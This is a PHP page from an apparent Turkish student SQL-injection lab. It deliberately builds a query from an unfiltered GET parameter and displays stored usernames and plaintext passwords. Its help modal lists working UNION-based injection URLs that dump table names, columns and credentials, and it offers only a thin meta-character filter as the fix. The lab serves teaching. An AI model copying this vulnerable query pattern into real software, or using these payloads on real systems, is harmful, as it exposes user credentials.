<?php 
include("config.php");
include("header.php");
include("SqlinjOnleme.php");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<body>
<br /><br /><br />
<form  method="GET" >
<table align="center">
<tr>
<td>TC NO</td>
<td> :</td>
<td><input type="text" name="TcNo" style="width:400px";></td>
</tr>
<tr> 
<td></td>
<td></td>
<td><input type="submit" name="giris" value="Giriş Yap" ></td>
</tr>
</table>
</form>
<?php 
	if( isset( $_GET[ 'giris' ] ) ) 
	{ 
    $TcNo = $_GET[ 'TcNo' ]; //get methodu ile TcNo bilgisinin alınması
	$sorgu  = "SELECT * FROM kullanici WHERE TcNo =$TcNo;" ; //Sql sorgu cümlesi
    $result = mysqli_query($baglanti,  $sorgu ) or die( '<pre>' . ((is_object($baglanti)) ?         mysqli_error($baglanti) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res 
	: false)) . '</pre>' ); //Sorgunun Çalıştırılması
	
    while( $row = mysqli_fetch_assoc( $result ) ) //gelen sonuçlar dizide tutulması
	{ 	
	
		$TcNo=$row["TcNo"];
        $ad = $row["ad"]; 
  		$soyad  = $row["soyad"];
		$kullaniciadi  = $row["kullaniciadi"];
		$password  = $row["password"];
        echo "<br/>TC NO: {$TcNo}<br /> Ad: {$ad}<br />Soyad: {$soyad}<br/> Kullanıcı                Adı:{$kullaniciadi}<br/>Şifresi: {$password}<br/>"; 
    } 
    mysqli_close($baglanti); 
	} 	
?>
<br /><br /><br /><br /><br /><br /><br />
 <div align="left" style="padding-left:550px">
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#myModal">
Yardım!    &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
</button>
<!-- Modal -->
<div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel"  >
  <div class="modal-dialog modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="myModalLabel">  SQL INJECTION </h4>
      </div>
      <div class="modal-body">
      Nedir?<br />
        Sql injection, Sql sorgularının arasına dışarıdan müdahalede bulunma, veri ekleme işleminin genel adıdır. Web uygulamalarında kullanıcılar tarafından girilen veriler ile dinamik Sql cümleleri oluşturulur. Bu cümleler oluşturulurken araya giren herhangi bir meta-karakter Sql injectiona neden olabilir. Meta-karakter; bir program için özel anlam ifade eden karakterlere verilen addır.Sql için ise meta-karakter “ ‘ ” (tek tırnak) ve “ ; ”(noktalı virgül) dür.
        <br /><br />
Neden Kaynaklanır?<br />
<img src="../sqlOnleme.jpg" width="761" height="391"><br />
Yukarıda görüldüğü gibi herhangi bir filtreleme işlemi ya da validaion kontrol yapılmamıştır.Sql cümlesi "SELECT * FROM kullanici WHERE TcNo =$TcNo;" <br />
Şeklinde tazılmıştır.Kullanıcı tarafından girilen girdi herhangi bir filtreleme işlemine tabi tutulmadığından,dışardan 99 or 1=1 gibi bir girdi girdiğinde tüm veritabanına erişim sağlanabilir.
<br /><br />
Sömürü URL'leri : <br />

Tablo İsimlerini Elde Etmek İçin<br />

http://localhost/yazlab/includes/sqlinjection.php?TcNo=99+or+1%3D1+union+select+unhex%28hex%28group_concat%28table_name%29%29%29%2C2%2C3%2C4%2C5+from+information_schema.tables&giris=Giri%C5%9F+Yap
<br /><br />
Kısıtlanmış Tablo İsimlerini Elde Etmek İçin<br />
http://localhost/yazlab/includes/sqlinjection.php?TcNo=99+or+1%3D1+union+select+unhex%28hex%28group_concat%28table_name%29%29%29%2C2%2C3%2C4%2C5+from+information_schema.tables+where+table_schema%3Ddatabase%28%29&giris=Giri%C5%9F+Yap
<br /><br />
Kolon İsimlerini Elde Etmek İçin<br />
http://localhost/yazlab/includes/sqlinjection.php?TcNo=99+or+1%3D1+union+select+unhex%28hex%28group_concat%28column_name%29%29%29%2C2%2C3%2C4%2C5+from+information_schema.columns&giris=Giri%C5%9F+Yap
<br /><br />
Kısıtlanmış Kolon İsimlerini Elde Etmek İçin<br />
http://localhost/yazlab/includes/sqlinjection.php?TcNo=99+or+1%3D1+union+select+unhex%28hex%28group_concat%28column_name%29%29%29%2C2%2C3%2C4%2C5+from+information_schema.columns+where+table_schema%3Ddatabase%28%29&giris=Giri%C5%9F+Yap
<br /><br />
Kullanıcı Adı Ve Şifreye Erişim İçin <br />
http://localhost/yazlab/includes/sqlinjection.php?TcNo=99+or+1%3D1+union+select+unhex%28hex%28group_concat%28kullaniciadi%2C0x3b%2Cpassword%29%29%29%2C2%2C3%2C4%2C5+from+kullanici&giris=Giri%C5%9F+Yap
<br /><br />
Tüm Veritabanına Erişim İçin<br />
http://localhost/yazlab/includes/sqlinjection.php?TcNo=99+or+1%3D1&giris=Giri%C5%9F+Yap<br />

Açığın Önlenmesi<br />
<img src="../sql.jpg" width="286" height="340"><br /><br />
Yukarıdaki fonksiyon koda uygun bir biçimde entegre edildiğinde sql açığı önlenmiş olur.Bu kod meta-karakterleri engelleyerek sql açığını giderir.
<div class="modal-footer">
  <button type="button" class="btn btn-default" data-dismiss="modal">Kapat</button>
      
</div>
    </div>
  </div>
</div>
</div>

</body>
</html>